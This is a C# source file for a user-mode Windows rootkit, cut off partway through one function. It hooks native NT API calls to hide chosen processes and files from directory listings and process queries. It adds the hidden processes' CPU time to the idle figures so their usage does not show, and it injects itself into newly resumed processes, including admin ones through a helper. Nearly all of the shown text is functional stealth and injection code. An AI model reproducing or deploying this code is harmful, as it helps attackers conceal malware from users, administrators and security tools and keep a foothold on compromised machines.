using CSharpRootkit.Structs;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Concurrent;
using System.Linq;
using System.Collections;
using static System.Net.WebRequestMethods;
using System.Diagnostics;
using System.Windows.Forms;

namespace CSharpRootkit
{
    public static class RootKit
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint NtQuerySystemInformationDelegate(RootKitInternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, IntPtr PReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint NtQueryDirectoryFileDelegate(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, IntPtr IoStatusBlock, IntPtr FileInformation, uint Length, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass, [MarshalAs(UnmanagedType.I1)] bool ReturnSingleEntry, IntPtr FileName, [MarshalAs(UnmanagedType.I1)] bool RestartScan);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint NtQueryDirectoryFileExDelegate(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, IntPtr IoStatusBlock, IntPtr FileInformation, uint Length, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass, uint QueryFlags, IntPtr FileName);
        
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate uint NtResumeThreadDelegate(IntPtr ThreadHandle, IntPtr SuspendCount);

        private static NtQuerySystemInformationDelegate OriginalNtQuerySystemInformation;
        private static NtQueryDirectoryFileDelegate OriginalNtQueryDirectoryFile;
        private static NtQueryDirectoryFileExDelegate OriginalNtQueryDirectoryFileEx;
        private static NtResumeThreadDelegate OriginalNtResumeThread;

        private static Dictionary<string, NativeFunctionHooker> contextManager = new Dictionary<string, NativeFunctionHooker>();
        private static List<Delegate> DelgateCache = new List<Delegate>();

        public static bool Started = false;

        private static List<int> HidePids = new List<int>();
        private static List<string> HideProcessNames = new List<string>();
        private static List<string> HideFilePaths = new List<string>();
        private static List<string> HideFileNames = new List<string>();

        private static bool GetHiddenApplicationsTimeData(out long accumulatedKernelTime, out long accumulatedUserTime, out ulong accumulatedCycleTime) 
        {
            accumulatedKernelTime = 0;
            accumulatedUserTime   = 0;
            accumulatedCycleTime  = 0;

            uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
            uint status = 0;
            uint offset = 0;
            uint dwSize = 0;
            IntPtr SystemInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION)));
            IntPtr PReturnLength = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(InternalStructs.UINTRESULT)));
            Marshal.StructureToPtr(new InternalStructs.UINTRESULT { Value = 0 }, PReturnLength, false);
            do
            {
                status = OriginalNtQuerySystemInformation(RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessInformation, SystemInformation, dwSize, PReturnLength);
                if (status == STATUS_INFO_LENGTH_MISMATCH)
                {
                    dwSize = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(PReturnLength).Value;
                    Marshal.StructureToPtr(new InternalStructs.UINTRESULT { Value = dwSize }, PReturnLength, false);
                    SystemInformation = Marshal.ReAllocHGlobal(SystemInformation, (IntPtr)dwSize);
                }
                else if (status != 0)
                {
                    Marshal.FreeHGlobal(SystemInformation);
                    Marshal.FreeHGlobal(PReturnLength);
                    return false;
                }
            } while (status != 0);

            Marshal.FreeHGlobal(PReturnLength);

            RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION CurrentProcInfo = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION>(SystemInformation);

            while (true)
            {
                string imageName = "";
                if (CurrentProcInfo.ImageName.Buffer != IntPtr.Zero)
                {
                    imageName = Marshal.PtrToStringUni(CurrentProcInfo.ImageName.Buffer);
                }

                if (HidePids.Contains((int)CurrentProcInfo.ProcessId) || (CurrentProcInfo.ProcessId != IntPtr.Zero && imageName != "" && HideProcessNames.Contains(imageName)))
                {
                    accumulatedKernelTime += CurrentProcInfo.KernelTime;
                    accumulatedUserTime += CurrentProcInfo.UserTime;
                    accumulatedCycleTime += CurrentProcInfo.CycleTime;
                }

                if (CurrentProcInfo.NextEntryOffset == 0)
                {
                    break;
                }
                else
                {
                    offset += CurrentProcInfo.NextEntryOffset;
                    CurrentProcInfo = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION>((IntPtr)((long)SystemInformation + offset));
                }
            }
            Marshal.FreeHGlobal(SystemInformation);
            return true;

        }
        
        private static bool IsHiddenPath(string path)
        {
            string[] pathsCopy = HideFilePaths.ToArray();
            foreach (string i in pathsCopy) 
            {
                if (Utils.ComparePaths(path, i))
                {
                    return true;
                }
            }
            return false;
        }
        private static string GetPathFromHandle(IntPtr file)
        {
            uint FILE_NAME_NORMALIZED = 0x0;

            StringBuilder FileNameBuilder = new StringBuilder(32767+2);//+2 for a possible null byte?
            uint pathLen = NativeMethods.GetFinalPathNameByHandleW(file, FileNameBuilder, (uint)FileNameBuilder.Capacity, FILE_NAME_NORMALIZED);
            if (pathLen == 0)
            {
                return null;
            }
            string FileName = FileNameBuilder.ToString(0, (int)pathLen);
            return FileName;
        }
        private static uint FileInformationGetNextEntryOffset(IntPtr FileInformation, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass)
        {
            if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>(FileInformation).NextEntryOffset;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileFullDirectoryInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_FULL_DIR_INFORMATION>(FileInformation).NextEntryOffset;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdFullDirectoryInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_ID_FULL_DIR_INFORMATION>(FileInformation).NextEntryOffset;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileBothDirectoryInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_BOTH_DIR_INFORMATION>(FileInformation).NextEntryOffset;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdBothDirectoryInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_ID_BOTH_DIR_INFORMATION>(FileInformation).NextEntryOffset;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileNamesInformation)
            {
                return Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_NAMES_INFORMATION>(FileInformation).NextEntryOffset;
            }
            return 0;
        }
        private static void FileInformationSetNextEntryOffset(IntPtr FileInformation, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass, uint value)
        {
            int offset = 0;
            if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>("NextEntryOffset");
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileFullDirectoryInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_FULL_DIR_INFORMATION>("NextEntryOffset");
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdFullDirectoryInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_ID_FULL_DIR_INFORMATION>("NextEntryOffset");
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileBothDirectoryInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_BOTH_DIR_INFORMATION>("NextEntryOffset");
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdBothDirectoryInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_ID_BOTH_DIR_INFORMATION>("NextEntryOffset");
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileNamesInformation)
            {
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_NAMES_INFORMATION>("NextEntryOffset");
            }
            Marshal.StructureToPtr(new InternalStructs.UINTRESULT { Value = value }, FileInformation + offset, false);
        }
        private static string FileInformationGetName(IntPtr FileInformation, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass)
        {
            if (FileInformation == IntPtr.Zero)
            {
                return null;
            }

            int offset;
            uint FileNameLength;

            if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation)
            {
                RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_DIRECTORY_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileFullDirectoryInformation)
            {
                RootKitInternalStructs.NT_FILE_FULL_DIR_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_FULL_DIR_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_FULL_DIR_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdFullDirectoryInformation)
            {
                RootKitInternalStructs.NT_FILE_ID_FULL_DIR_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_ID_FULL_DIR_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_ID_FULL_DIR_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileBothDirectoryInformation)
            {
                RootKitInternalStructs.NT_FILE_BOTH_DIR_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_BOTH_DIR_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_BOTH_DIR_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;
                
            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdBothDirectoryInformation)
            {
                RootKitInternalStructs.NT_FILE_ID_BOTH_DIR_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_ID_BOTH_DIR_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_ID_BOTH_DIR_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;

            }
            else if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileNamesInformation)
            {
                RootKitInternalStructs.NT_FILE_NAMES_INFORMATION dataStruct = Marshal.PtrToStructure<RootKitInternalStructs.NT_FILE_NAMES_INFORMATION>(FileInformation);
                offset = (int)Marshal.OffsetOf<RootKitInternalStructs.NT_FILE_NAMES_INFORMATION>("FileNameStart");
                FileNameLength = dataStruct.FileNameLength;
            }
            else
            {
                return null;
            }
            IntPtr stringAddress = FileInformation + offset;
            string result = Marshal.PtrToStringUni(stringAddress, (int)FileNameLength / 2);//divide by 2 as its length in bytes, but a char in unicode is 2 bytes so we need half
            return result.TrimEnd('\0');
        }
        private static bool JankyUnPauseUntilKernel32LoadedThenPause(IntPtr ThreadHandle, IntPtr ProcHandle, int maxLoopCount = 1000, int ExtraWaitTimeAfterFound=0)
        {
            if (!Started)
            {
                NativeMethods.NtResumeThread(ThreadHandle, IntPtr.Zero);
            }
            else 
            {
                OriginalNtResumeThread(ThreadHandle, IntPtr.Zero);
            }
            
            bool is64bit = Utils.IsProcess64Bit(ProcHandle);
            int count = 0;
            while (count < maxLoopCount)
            {
                count++;
                try
                {
                    if (is64bit)
                    {
                        Utils64.GetRemoteProcAddress64Bit(ProcHandle, Utils64.GetRemoteModuleHandle64Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded

                    }
                    else
                    {
                        Utils32.GetRemoteProcAddress32Bit(ProcHandle, Utils32.GetRemoteModuleHandle32Bit(ProcHandle, "kernel32.dll"), "HeapAlloc");//just a random function to to test that Its really loaded
                    }
                    break;
                }
                catch
                {
                }
            }
            Thread.Sleep(ExtraWaitTimeAfterFound);
            NativeMethods.NtSuspendThread(ThreadHandle, IntPtr.Zero);
            if (count >= maxLoopCount) 
            {
                return false;
            }
            return true;
        }
        private static uint NtQuerySystemInformationHook(RootKitInternalStructs.SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, IntPtr PReturnLength)
        {
            if (SystemInformationClass != RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessInformation && SystemInformationClass != RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorPerformanceInformation
                && SystemInformationClass != RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorPerformanceInformationEx && SystemInformationClass != RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorIdleCycleTimeInformation) 
            {
                return OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, PReturnLength);
            }

            IntPtr PRealReturnLength = Marshal.AllocHGlobal(sizeof(uint));
            uint QueryResult = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, PRealReturnLength);
            uint RealReturnLength = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(PRealReturnLength).Value;
            
            if (PReturnLength != IntPtr.Zero)
            {
                NativeMethods.CopyMemory(PReturnLength, PRealReturnLength, (UIntPtr)sizeof(uint));
            }
            Marshal.FreeHGlobal(PRealReturnLength);
            uint SUCCESS = 0x00000000;
            
            if (QueryResult != SUCCESS)
            {
                return QueryResult;
            }
            if (SystemInformationClass == RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessInformation)
            {
                long accumulatedKernelTime = 0;
                long accumulatedUserTime = 0;
                ulong accumulatedCycleTime = 0;

                uint offset = 0;
                uint previousOffset = 0;


                while (true) 
                {
                    RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION CurrentProcInfo = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION>((IntPtr)((ulong)SystemInformation + offset));
                    
                    string imageName = "";
                    if (CurrentProcInfo.ImageName.Buffer != IntPtr.Zero)
                    {
                        imageName = Marshal.PtrToStringUni(CurrentProcInfo.ImageName.Buffer).ToLower();
                    }

                    if (HidePids.Contains((int)CurrentProcInfo.ProcessId) || (CurrentProcInfo.ProcessId != IntPtr.Zero && imageName != "" && HideProcessNames.Contains(imageName))) // if (previousOffset == 0) its the first item, we can add handling for this, but its very unlikley, you would need to be hiding a system process or something stupid, no point.
                    {
                        accumulatedKernelTime += CurrentProcInfo.KernelTime;
                        accumulatedUserTime += CurrentProcInfo.UserTime;
                        accumulatedCycleTime += CurrentProcInfo.CycleTime;

                        IntPtr previousProcInfoAddr = (IntPtr)((ulong)SystemInformation + previousOffset);

                        RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION PreviousCurrentProcInfo = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION>(previousProcInfoAddr);

                        PreviousCurrentProcInfo.NextEntryOffset += CurrentProcInfo.NextEntryOffset;

                        if (CurrentProcInfo.NextEntryOffset == 0) 
                        {
                            PreviousCurrentProcInfo.NextEntryOffset = 0;
                            Marshal.StructureToPtr(PreviousCurrentProcInfo, previousProcInfoAddr, false);
                            break;
                        }

                        Marshal.StructureToPtr(PreviousCurrentProcInfo, previousProcInfoAddr, false);
                        offset = previousOffset;
                        continue;

                    }

                    if (CurrentProcInfo.NextEntryOffset == 0)
                    {
                        break;
                    }
                    
                    previousOffset = offset;
                    offset += CurrentProcInfo.NextEntryOffset;

                }

                offset = 0;
                
                while (true) 
                {
                
                    RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION CurrentProcInfo = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESS_INFORMATION>((IntPtr)((ulong)SystemInformation + offset));
                
                    if ((int)CurrentProcInfo.ProcessId == 0)
                    {
                        IntPtr CurrentProcInfoAddr = (IntPtr)((ulong)SystemInformation + offset);
                        CurrentProcInfo.KernelTime = accumulatedKernelTime;
                        CurrentProcInfo.UserTime = accumulatedUserTime;
                        CurrentProcInfo.CycleTime = accumulatedCycleTime;
                        Marshal.StructureToPtr(CurrentProcInfo, CurrentProcInfoAddr, false);
                        break;
                    }
                
                    if (CurrentProcInfo.NextEntryOffset == 0) 
                    {
                        break;
                    }
                
                    offset += CurrentProcInfo.NextEntryOffset;
                
                }
            }
            else if (SystemInformationClass == RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorPerformanceInformation)
            {
                if (GetHiddenApplicationsTimeData(out long accumulatedKernelTime, out long accumulatedUserTime, out ulong accumulatedCycleTime))
                {
                    int structSize = Marshal.SizeOf(typeof(RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION));
                    uint numberOfProcessors = RealReturnLength / (uint)structSize;
                    for (int i = 0; i < numberOfProcessors; i++)
                    {
                        IntPtr currentPos = SystemInformation + (structSize * i);
                        RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION Processor_info = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION>(currentPos);
                        Processor_info.KernelTime += (accumulatedUserTime / numberOfProcessors);
                        Processor_info.UserTime -= (accumulatedUserTime / numberOfProcessors);
                        Processor_info.IdleTime += ((accumulatedKernelTime + accumulatedUserTime) / numberOfProcessors);
                        Marshal.StructureToPtr(Processor_info, currentPos, false);
                    }
                }
            }
            else if (SystemInformationClass == RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorPerformanceInformationEx)
            {
                if (GetHiddenApplicationsTimeData(out long accumulatedKernelTime, out long accumulatedUserTime, out ulong accumulatedCycleTime))
                {
                    int structSize = Marshal.SizeOf(typeof(RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX));
                    int numberOfProcessors = (int)RealReturnLength / structSize;
                    for (int i = 0; i < numberOfProcessors; i++)
                    {
                        IntPtr currentPos = SystemInformation + (structSize * i);
                        RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX Processor_info = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION_EX>(currentPos);
                        Processor_info.KernelTime += (accumulatedUserTime / numberOfProcessors);
                        Processor_info.UserTime -= (accumulatedUserTime / numberOfProcessors);
                        Processor_info.IdleTime += ((accumulatedKernelTime + accumulatedUserTime) / numberOfProcessors);
                        Marshal.StructureToPtr(Processor_info, currentPos, false);
                    }
                }
            }
            else if (SystemInformationClass == RootKitInternalStructs.SYSTEM_INFORMATION_CLASS.SystemProcessorIdleCycleTimeInformation)
            {
                if (GetHiddenApplicationsTimeData(out long accumulatedKernelTime, out long accumulatedUserTime, out ulong accumulatedCycleTime))
                {
                    int structSize = Marshal.SizeOf(typeof(RootKitInternalStructs.SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION));
                    long numberOfProcessors = RealReturnLength / structSize;
                    for (int i = 0; i < numberOfProcessors; i++)
                    {
                        IntPtr currentPos = SystemInformation + (structSize * i);
                        RootKitInternalStructs.SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION Processor_info = Marshal.PtrToStructure<RootKitInternalStructs.SYSTEM_PROCESSOR_IDLE_CYCLE_TIME_INFORMATION>(currentPos);
                        Processor_info.CycleTime += (accumulatedCycleTime / (ulong)numberOfProcessors);
                        Marshal.StructureToPtr(Processor_info, currentPos, false);
                    }
                }
            }
            
            return QueryResult;
        }
        private static uint NtQueryDirectoryFileHook(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, IntPtr IoStatusBlock, IntPtr FileInformation, uint Length, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass, bool ReturnSingleEntry, IntPtr FileName, bool RestartScan)
        {
            uint SUCCESS = 0x00000000;
            uint STATUS_NO_MORE_FILES = 0x80000006;
            uint status = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
            
            if (Event != IntPtr.Zero || ApcRoutine != IntPtr.Zero)//I dont have support for async calls like that yet.
            {
                return status;
            }
            if (status != SUCCESS) 
            {
                return status;
            }


            if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileFullDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdFullDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileBothDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdBothDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileNamesInformation)
            {
                string fileDirectoryPath;
                InternalStructs.FileType fileType = NativeMethods.GetFileType(FileHandle);
                if (fileType == InternalStructs.FileType.FILE_TYPE_UNKNOWN) 
                {
                    return status;
                }
                
                if (fileType == InternalStructs.FileType.FILE_TYPE_PIPE)
                {
                    fileDirectoryPath = "\\\\.\\pipe\\";
                }
                else
                {
                    fileDirectoryPath = GetPathFromHandle(FileHandle)?.ToLower();
                    if (fileDirectoryPath == null)
                    {
                        return status;
                    }
                    if (fileDirectoryPath.StartsWith("\\\\?\\"))
                    {
                        fileDirectoryPath = fileDirectoryPath.Substring(4);
                    }
                }
                
                if (ReturnSingleEntry)
                {
                    string FileInformationFileName = FileInformationGetName(FileInformation, FileInformationClass);

                    bool skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                    while (skip)
                    {
                        status = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
                        if (status != SUCCESS)
                        {
                            return status;
                        }
                        FileInformationFileName = FileInformationGetName(FileInformation, FileInformationClass);
                        skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                    }
                }
                else
                {
                    
                    IntPtr CurrentAddress = FileInformation;
                    IntPtr PreviousAddress = CurrentAddress;
                    uint nextOffset = 0;

                    bool IsFirstObject = true;

                    while (true)
                    {
                        string FileInformationFileName = FileInformationGetName(CurrentAddress, FileInformationClass);
                        uint currentOffset = nextOffset;
                        nextOffset = FileInformationGetNextEntryOffset(CurrentAddress, FileInformationClass);
                        bool skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                        if (skip)
                        {
                            if (IsFirstObject && nextOffset != 0)
                            {
                                //skip it, we dont have handling for this, this would be "." and you should never hide that.
                            }
                            else if (nextOffset != 0)
                            {
                                FileInformationSetNextEntryOffset(PreviousAddress, FileInformationClass, currentOffset + nextOffset);
                                CurrentAddress = PreviousAddress + (int)currentOffset + (int)nextOffset;
                                nextOffset += currentOffset;
                                continue;
                            }
                            else
                            {
                                if (CurrentAddress == FileInformation)
                                {
                                    status = STATUS_NO_MORE_FILES;
                                }
                                else
                                {
                                    FileInformationSetNextEntryOffset(PreviousAddress, FileInformationClass, 0);
                                }
                                break;
                            }
                        }

                        IsFirstObject = false;
                        if (nextOffset == 0)
                        {
                            break;
                        }
                        else
                        {
                            PreviousAddress = CurrentAddress;
                            CurrentAddress += (int)nextOffset;
                        }
                    }
                }
            }

            return status;

        }
        private static uint NtQueryDirectoryFileExHook(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, IntPtr IoStatusBlock, IntPtr FileInformation, uint Length, RootKitInternalStructs.FILE_INFORMATION_CLASS FileInformationClass, uint QueryFlags, IntPtr FileName) 
        {
            uint SL_RESTART_SCAN = 0x00000001;
            uint SL_RETURN_SINGLE_ENTRY = 0x00000002;
            bool RestartScan = (QueryFlags & SL_RESTART_SCAN) !=0;
            bool ReturnSingleEntry = (QueryFlags & SL_RETURN_SINGLE_ENTRY) != 0;

            uint SUCCESS = 0x00000000;
            uint STATUS_NO_MORE_FILES = 0x80000006;
            uint status = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);

            if (Event != IntPtr.Zero || ApcRoutine != IntPtr.Zero)//I dont have support for async calls like that yet.
            {
                return status;
            }
            if (status != SUCCESS)
            {
                return status;
            }


            if (FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileFullDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdFullDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileBothDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileIdBothDirectoryInformation || FileInformationClass == RootKitInternalStructs.FILE_INFORMATION_CLASS.FileNamesInformation)
            {
                string fileDirectoryPath;
                if (NativeMethods.GetFileType(FileHandle) == InternalStructs.FileType.FILE_TYPE_PIPE)
                {
                    fileDirectoryPath = "\\\\.\\pipe\\";
                }
                else
                {
                    fileDirectoryPath = GetPathFromHandle(FileHandle)?.ToLower();
                    if (fileDirectoryPath == null)
                    {
                        return status;
                    }
                    if (fileDirectoryPath.StartsWith("\\\\?\\"))
                    {
                        fileDirectoryPath = fileDirectoryPath.Substring(4);
                    }
                }

                if (ReturnSingleEntry)
                {
                    string FileInformationFileName = FileInformationGetName(FileInformation, FileInformationClass);

                    bool skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                    while (skip)
                    {
                        status = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
                        if (status != SUCCESS)
                        {
                            return status;
                        }
                        FileInformationFileName = FileInformationGetName(FileInformation, FileInformationClass);
                        skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));
                    }

                }
                else
                {
                    IntPtr CurrentAddress = FileInformation;
                    IntPtr PreviousAddress = CurrentAddress;
                    uint nextOffset = 0;
                    bool IsFirstObject = true;

                    while (true)
                    {
                        string FileInformationFileName = FileInformationGetName(CurrentAddress, FileInformationClass);
                        uint currentOffset = nextOffset;
                        nextOffset = FileInformationGetNextEntryOffset(CurrentAddress, FileInformationClass);
                        bool skip = HideFileNames.Contains(FileInformationFileName.ToLower()) || IsHiddenPath(Path.Combine(fileDirectoryPath, FileInformationFileName));

                        if (skip)
                        {
                            if (IsFirstObject && nextOffset != 0)
                            {
                                //skip it, we dont have handling for this, this would be "." and you should never hide that.
                            }
                            else if (nextOffset != 0)
                            {
                                FileInformationSetNextEntryOffset(PreviousAddress, FileInformationClass, currentOffset + nextOffset);
                                CurrentAddress = PreviousAddress + (int)currentOffset + (int)nextOffset;
                                nextOffset += currentOffset;
                                continue;
                            }
                            else
                            {
                                if (CurrentAddress == FileInformation)
                                {
                                    status = STATUS_NO_MORE_FILES;
                                }
                                else
                                {
                                    FileInformationSetNextEntryOffset(PreviousAddress, FileInformationClass, 0);
                                }
                                break;
                            }
                        }

                        IsFirstObject = false;
                        if (nextOffset == 0)
                        {
                            break;
                        }
                        else
                        {
                            PreviousAddress = CurrentAddress;
                            CurrentAddress += (int)nextOffset;
                        }
                    }
                }

            }
            return status;
        }
        private static uint NtResumeThreadHook(IntPtr ThreadHandle, IntPtr SuspendCount)
        {
            //return OriginalNtResumeThread(ThreadHandle, SuspendCount);
            uint procId = NativeMethods.GetProcessIdOfThread(ThreadHandle);
            if (procId != NativeMethods.GetCurrentProcessId() && !RootKitClientInterface.IsAgainstInclusionExclusionRules((int)procId))// if the process its opening is admin, we need to get talk to a admin rootkit process to inject into it.
            {
                if (!Utils.IsAdmin() && Utils.IsProcessAdmin((int)procId, out bool ProcIsAdmin) && ProcIsAdmin) 
                {
                    //if the process its opening is admin, we need to get talk to a admin rootkit process to inject into it.
                    RootKitClientInterface.NtResumeThread_InjectAdminProcess((int)procId);
                    return OriginalNtResumeThread(ThreadHandle, SuspendCount);
                }
                
                IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights((int)procId);
